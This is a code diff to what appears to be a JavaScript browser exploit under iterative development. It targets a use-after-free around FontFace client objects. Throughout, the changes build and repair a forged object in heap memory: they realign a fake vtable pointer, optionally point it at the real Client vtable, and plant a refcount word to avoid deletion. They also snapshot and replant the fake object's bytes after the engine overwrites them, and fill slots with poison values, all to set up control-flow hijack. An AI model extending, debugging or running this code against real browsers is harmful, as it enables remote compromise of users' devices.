@@ -51,7 +51,8 @@ var NC=qint('nc',0); /* nocli control: leave impl m_ptr=0 (expired weak) — ite
 var SW=qint('sw',-1),PK2=qint('pk2',-1),SW2=qint('sw2',-1),PK3=qint('pk3',-1),SW3=qint('sw3',-1),EB=qint('eb',0); /* v23/v24/v26: chosen-call + empty-bucket discriminator */
 var RP=qint('rp',0); /* v27: resolve-before-free (cobrajet302gt prediction #295) — defer the free until vf.loaded settles; RAW00 then reads the object in its post-settlement state */
 var FW=qint('fw',0);
-var NP=qint('np',0); /* v30b: occupied bucket + dead impl (m_ptr=0) — skipEmptyBuckets bisection of the pre-client kill */ /* v30: yield to the genuine FontFace client (walk FO+0x20) — controls whether the kill is in our fake client's shape (survives) or in the pre-client WeakHashSet/hash walk (dies). */
+var NP=qint('np',0);
+var VTR=qint('vtr',0); /* v33: point the hosted client's vptr at the REAL Client vtable (walk VP) — isolates copied-table flaws (thunk/typeinfo) from object-body kills. Run with pk=-1. */ /* v30b: occupied bucket + dead impl (m_ptr=0) — skipEmptyBuckets bisection of the pre-client kill */ /* v30: yield to the genuine FontFace client (walk FO+0x20) — controls whether the kill is in our fake client's shape (survives) or in the pre-client WeakHashSet/hash walk (dies). */
 var CE=qint('ce',0); /* v29: client-elsewhere — impl m_ptr points at the sk-lane
        object (firstSpAddr+0x88: vptr→copied table, rc=2@+8, zeros after)
        instead of the 8-byte client at self+CLI, whose rc@client+8 fell in
@@ -81,7 +82,7 @@ else if(/[?&]soft=1/.test(location.search)){
   try{localStorage.removeItem('p691_tries');}catch(e){}
   b('SOFT');document.body.innerHTML='<p style="font:700 26px monospace">counter cleared</p>';
 }
-else { b('VER-3'); b('BOOT-'+UID+',ctl='+CTL+',coop='+COOP+',rp='+RP+',ce='+CE+',fw='+FW+',np='+NP); }
+else { b('VER-6'); b('BOOT-'+UID+',ctl='+CTL+',coop='+COOP+',rp='+RP+',ce='+CE+',fw='+FW+',np='+NP+',vtr='+VTR); }
 
 /* --- pre-fault iso-heap: commit pages so PH3 scan doesn't crash on unmapped memory --- */
 var PREFAULT=qint('pf',12000); /* commit 192B pages so PH3/hints do not fault on unmapped VA */
@@ -759,11 +760,21 @@ function phase(){
         var vptrTarget=VP;
         if(COOP===2){
           if(SKIPJ<0||VTAB===0n){bs('COOP-NO-VTAB');verd('bad','NO VTAB lane');return;}
-          vptrTarget=VTAB+8n;
+          /* v31 GEOMETRY FIX: the copied slots live at sk+8+8j (address
+             firstSpAddr+8+8j). The old vptrTarget=VTAB+8=firstSpAddr+0x4C was
+             HALF-SLOT MISALIGNED (VTAB was the +0x44 search marker, not a
+             vtable) — every dispatched slot i was read at +0x4C+8i, a
+             straddle of written slots (i=6 -> bytes +0x7C..+0x84, composite
+             ~0x2_00000008 = wild pointer). That killed EVERY yield regardless
+             of pk/sw stubs (which wrote to +8+8i, never read). vptr must
+             point at slot 0 = firstSpAddr+8. */
+          vptrTarget=firstSpAddr+8n;
+          if(VTR&&VP>0x100000000n){vptrTarget=VP;bs('VTR-REAL-vp'+hex(VP));} /* fix: module band 0x80-0x82xxxxxxxx is BELOW 0x1000000000 — gate on 0x100000000 */
           var sk=window.__sp[SKIPJ];
           for(var jv=0;jv<16;jv++){put64(sk,8+jv*8,slots[jv]);}
           for(var zz=0x80;zz<0xC0;zz++)sk[zz]=0;
-          put32(sk,0x80,2);put64(sk,0x88,VTAB+8n);put32(sk,0x90,CE?0:2); /* v29b: client+8 = CanMakeWeakPtr m_weakImpls — must be NULL on the hosted client (2 was a wild weak-impl ptr). FontFace layout: RefCounted@client-0x20, ActiveDOMObject@client-0x18, Client@client (ott -32, walk-confirmed). */
+          put32(sk,0x80,2);put64(sk,0x88,vptrTarget);put32(sk,0x90,CE?0:2);
+          put32(sk,0x68,0x1000);put32(sk,0x6C,0); /* v31: sane rc word at client-0x20 (= copied slot 12, u32@+0x68) — real ref()/deref() increment/decrement THIS; 0x1000 keeps it far from 0 and from the delete path */ /* v29b: client+8 = CanMakeWeakPtr m_weakImpls — must be NULL on the hosted client (2 was a wild weak-impl ptr). FontFace layout: RefCounted@client-0x20, ActiveDOMObject@client-0x18, Client@client (ott -32, walk-confirmed). */
           if(PK===16&&IVP){
             for(var pa=0;pa<16;pa++)put64(sk,8+pa*8,0x4141414141414141n);
           }else if(PK>=0&&PK<16){
@@ -782,6 +793,11 @@ function phase(){
               if(PK3>=0&&PK3<16){var poison3=(SW3>=0&&SW3<16)?slots[SW3]:slots[PK3];put64(sk,8+PK3*8,poison3);bs('SWAP3-pk'+PK3+'<-s'+SW3);}
             }
           }
+          /* v32: snapshot the whole sk surface (slots, swaps, header,
+             client vptr/rc/weak) — the sk lane is a LIVE engine object and
+             gets stomped between LAY and dispatch like m_table did (v21);
+             the REPLANT phase below restores it. */
+          window.__skSnap=sk.slice(0,0xC0);
           bs('COOP-HEAP-vt='+hex(vptrTarget)+',pk='+PK);
         }else{
           bs('COOP-MOD-vptr='+hex(VP));
@@ -889,6 +905,12 @@ function phase(){
             fw2[0x9C]=0;fw2[0x9D]=0;fw2[0x9E]=0;fw2[0x9F]=0;
           }
           bs('REPLANT-T'+hex(le(fw2,0x58))+(EB?'-EB':''));
+          if(window.__skSnap&&window.__sp[SKIPJ]){
+            var skv=window.__sp[SKIPJ];
+            bs('SKRB-VP'+hex(le(skv,0x88))+',s6-'+hex(le(skv,0x38))+',s4-'+hex(le(skv,0x28)));
+            for(var ib2=0;ib2<0xC0;ib2++)skv[ib2]=window.__skSnap[ib2];
+            bs('SKRB2-VP'+hex(le(skv,0x88))+',s6-'+hex(le(skv,0x38))+',s4-'+hex(le(skv,0x28)));
+          }
         }catch(e){bs('REPLANT-ERR');}
         bs('FAM-GO');
         try{faces[zi].family='zzq'+(Date.now()%1000);bs('FAM-AFTER');}
